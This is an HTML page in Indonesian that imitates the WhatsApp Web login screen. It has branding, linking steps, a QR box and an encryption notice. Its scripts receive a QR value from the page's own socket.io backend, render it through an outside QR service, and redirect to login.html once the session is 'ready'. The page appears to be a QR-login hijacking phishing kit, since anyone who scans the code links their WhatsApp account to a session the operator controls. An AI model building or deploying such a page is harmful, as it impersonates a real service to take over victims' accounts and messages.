

<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>WhatsApp</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
      background-color: #0b141a;
      color: #e9edef;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }

    .container {
      max-width: 900px;
      width: 100%;
      display: flex;
      flex-direction: column;
      gap: 20px;
    }

    .download-banner {
      background-color: #1f2937;
      border: 1px solid #374151;
      border-radius: 16px;
      padding: 24px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 20px;
    }

    .download-content {
      display: flex;
      align-items: center;
      gap: 20px;
      flex: 1;
    }

    .download-icon {
      width: 48px;
      height: 48px;
      background-color: #374151;
      border-radius: 8px;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-shrink: 0;
    }

    .download-icon svg {
      width: 24px;
      height: 24px;
      fill: #9ca3af;
    }

    .download-text {
      flex: 1;
    }

    .download-title {
      font-size: 16px;
      font-weight: 500;
      color: #e9edef;
      margin-bottom: 4px;
    }

    .download-description {
      font-size: 14px;
      color: #9ca3af;
      line-height: 1.4;
    }

    .download-button {
      background-color: #25d366;
      color: white;
      border: none;
      padding: 12px 24px;
      border-radius: 24px;
      font-size: 14px;
      font-weight: 500;
      cursor: pointer;
      display: flex;
      align-items: center;
      gap: 8px;
      transition: background-color 0.2s;
      flex-shrink: 0;
    }

    .download-button:hover {
      background-color: #1ea952;
    }

    .login-card {
      background-color: #1f2937;
      border: 1px solid #374151;
      border-radius: 16px;
      padding: 40px;
      display: flex;
      flex-direction: column;
    }

    .login-title {
      font-size: 32px;
      font-weight: 300;
      color: #e9edef;
      margin-bottom: 40px;
    }

    .login-content {
      display: flex;
      align-items: flex-start;
      gap: 60px;
    }

    .steps-container {
      flex: 1;
      display: flex;
      flex-direction: column;
      gap: 20px;
    }

    .step {
      display: flex;
      align-items: flex-start;
      gap: 16px;
    }

    .step-number {
      width: 24px;
      height: 24px;
      background-color: transparent;
      border: 1.5px solid #9ca3af;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 13px;
      font-weight: 400;
      color: #9ca3af;
      flex-shrink: 0;
      margin-top: 2px;
    }

    .step-text {
      font-size: 14px;
      color: #d1d5db;
      line-height: 1.5;
      margin-top: 2px;
    }

    .step-text .whatsapp-highlight {
      color: #e9edef;
      font-weight: 500;
    }

    .step-text .whatsapp-logo {
      display: inline-flex;
      align-items: center;
      background-color: #25d366;
      color: white;
      padding: 2px 6px;
      border-radius: 4px;
      font-size: 12px;
      font-weight: 500;
      margin: 0 2px;
    }

    .qr-container {
      flex-shrink: 0;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 20px;
    }

    .qr-image {
    width: 264px;
    height: 264px;
    object-fit: contain;
    border-radius: 8px;
    }

    .qr-placeholder {
      width: 264px;
      height: 264px;
      background-color: #111827;
      border-radius: 12px;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      gap: 16px;
      cursor: pointer;
      transition: background-color 0.2s;
    }

    .qr-placeholder:hover {
      background-color: #1f2937;
    }

    .refresh-icon {
      width: 40px;
      height: 40px;
      color: #9ca3af;
      animation: rotate 2s linear infinite;
    }

    @keyframes rotate {
      from { transform: rotate(0deg); }
      to { transform: rotate(360deg); }
    }

    .qr-text {
      font-size: 14px;
      color: #9ca3af;
      text-align: center;
      line-height: 1.4;
    }

    .login-options {
      display: flex;
      flex-direction: column;
      gap: 20px;
      margin-top: 40px;
    }

    .keep-logged-in {
      display: flex;
      align-items: center;
      gap: 12px;
    }

    .checkbox {
      width: 18px;
      height: 18px;
      background-color: #25d366;
      border: none;
      border-radius: 3px;
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      transition: background-color 0.2s;
    }

    .checkbox:hover {
      background-color: #1ea952;
    }

    .checkbox svg {
      width: 12px;
      height: 12px;
      fill: white;
    }

    .checkbox-label {
      font-size: 14px;
      color: #d1d5db;
      cursor: pointer;
      user-select: none;
    }

    .phone-login {
      color: #8bb9fe;
      text-decoration: none;
      font-size: 14px;
      font-weight: 400;
      display: inline-flex;
      align-items: center;
      gap: 6px;
      transition: color 0.2s;
    }

    .phone-login:hover {
      color: #60a5fa;
    }

    .footer {
      text-align: center;
      margin-top: 40px;
      display: flex;
      flex-direction: column;
      gap: 16px;
    }

    .footer-text {
      font-size: 14px;
      color: #9ca3af;
    }

    .footer-link {
      color: #8bb9fe;
      text-decoration: none;
      transition: color 0.2s;
    }

    .footer-link:hover {
      color: #60a5fa;
    }

    .encryption-info {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
    }

    .lock-icon {
      width: 16px;
      height: 16px;
      fill: #9ca3af;
    }

    .encryption-text {
      font-size: 13px;
      color: #9ca3af;
    }

    @media (max-width: 768px) {
      .container {
        padding: 10px;
      }

      .login-content {
        flex-direction: column;
        gap: 30px;
        align-items: center;
      }

      .qr-placeholder {
        width: 200px;
        height: 200px;
      }

      .login-card {
        padding: 30px 20px;
      }

      .login-title {
        font-size: 24px;
        text-align: center;
      }

      .download-content {
        flex-direction: column;
        text-align: center;
      }

      .download-banner {
        flex-direction: column;
        gap: 20px;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="download-banner">
      <div class="download-content">
        <div class="download-icon">
          <svg viewBox="0 0 24 24">
            <path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/>
          </svg>
        </div>
        <div class="download-text">
          <div class="download-title">Unduh WhatsApp untuk Windows</div>
          <div class="download-description">Buat panggilan, bagikan layar, dan dapatkan pengalaman lebih cepat dengan mengunduh WhatsApp untuk Windows.</div>
        </div>
      </div>
      <button class="download-button">
        Unduh
        <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
          <path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/>
        </svg>
      </button>
    </div>

    <div class="login-card">
      <h2 class="login-title">Langkah untuk login</h2>
      
      <div class="login-content">
        <div class="steps-container">
          <div class="step">
            <div class="step-number">1</div>
            <div class="step-text">
              Buka <span class="whatsapp-highlight">WhatsApp</span> 
              <span class="whatsapp-logo">üì±</span> di telepon
            </div>
          </div>
          <div class="step">
            <div class="step-number">2</div>
            <div class="step-text">
              Di Android ketuk <span class="whatsapp-highlight">Menu</span> ‚ãÆ ¬∑ Di iPhone ketuk <span class="whatsapp-highlight">Pengaturan</span> ‚öôÔ∏è
            </div>
          </div>
          <div class="step">
            <div class="step-number">3</div>
            <div class="step-text">
              Ketuk <span class="whatsapp-highlight">Perangkat tertaut</span>, lalu <span class="whatsapp-highlight">Tautkan perangkat</span>
            </div>
          </div>
          <div class="step">
            <div class="step-number">4</div>
            <div class="step-text">
              Pindai kode QR <span class="whatsapp-highlight">untuk mengonfirmasi</span>
            </div>
          </div>
        </div>
        
        <div class="qr-container">
          <div class="qr-placeholder" onclick="refreshQR()">
            <svg class="refresh-icon" viewBox="0 0 24 24" fill="currentColor">
              <path d="M17.65 6.35C16.2 4.9 14.21 4 12 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08c-.82 2.33-3.04 4-5.65 4-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"/>
            </svg>
            <div class="qr-text">Klik untuk memuat<br>ulang kode QR</div>
          </div>
        </div>
      </div>

      <div class="login-options">
        <div class="keep-logged-in">
          <div class="checkbox">
            <svg viewBox="0 0 24 24">
              <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
            </svg>
          </div>
          <span class="checkbox-label">Tetap masuk di browser ini ‚ÑπÔ∏è</span>
        </div>

        <a href="#" class="phone-login">
          Login dengan nomor telepon
          <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
            <path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.41z"/>
          </svg>
        </a>
      </div>
    </div>

    <div class="footer">
      <div class="footer-text">
        Tidak punya akun WhatsApp? <a href="#" class="footer-link">Mulai ‚Üí</a>
      </div>
      <div class="encryption-info">
        <svg class="lock-icon" viewBox="0 0 24 24">
          <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM9 6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9V6z"/>
        </svg>
        <span class="encryption-text">Pesan pribadi Anda terenkripsi secara end-to-end</span>
      </div>
    </div>
  </div>
  <script>
  console.log("üåê Script dijalankan");
</script>

<script src="/socket.io/socket.io.js"></script>
  <script>
    function refreshQR() {
      const qrPlaceholder = document.querySelector('.qr-placeholder');
      const refreshIcon = document.querySelector('.refresh-icon');
      
      // Add loading state
      qrPlaceholder.style.opacity = '0.5';
      refreshIcon.style.animationDuration = '0.5s';
      
      // Simulate loading
      setTimeout(() => {
        qrPlaceholder.style.opacity = '1';
        refreshIcon.style.animationDuration = '2s';
        
        // Show success message briefly
        const qrText = document.querySelector('.qr-text');
        const originalText = qrText.innerHTML;
        qrText.innerHTML = 'Kode QR dimuat ulang';
        qrText.style.color = '#25d366';
        
        setTimeout(() => {
          qrText.innerHTML = originalText;
          qrText.style.color = '#9ca3af';
        }, 1500);
      }, 1000);
    }

    // Checkbox interaction
    document.querySelector('.checkbox').addEventListener('click', function() {
      const isChecked = this.style.backgroundColor === 'rgb(55, 65, 81)';
      this.style.backgroundColor = isChecked ? '#25d366' : '#374151';
    });

    // Phone login click
    document.querySelector('.phone-login').addEventListener('click', function(e) {
      e.preventDefault();
      alert('Login dengan nomor telepon akan segera tersedia');
    });

    // Auto refresh QR simulation
    setInterval(() => {
      refreshQR();
    }, 45000);
  </script>
  <script>
    const socket = io(); // koneksi ke backend socket.io

    socket.on('qr', (qr) => {
      const qrContainer = document.querySelector('.qr-placeholder');
      qrContainer.innerHTML = `
        <img src="https://api.qrserver.com/v1/create-qr-code/?data=${encodeURIComponent(qr)}&size=264x264" 
            alt="QR Code" 
            style="width: 100%; height: 100%; object-fit: contain;" />
      `;
    });
  </script>
  <script>
    socket.on('ready', () => {    
      console.log("‚úÖ sesion tersimapn");
      sessionStorage.setItem("fromIndex", "yes");
      window.location.href = 'login.html';
    });
  </script>
</body>
</html>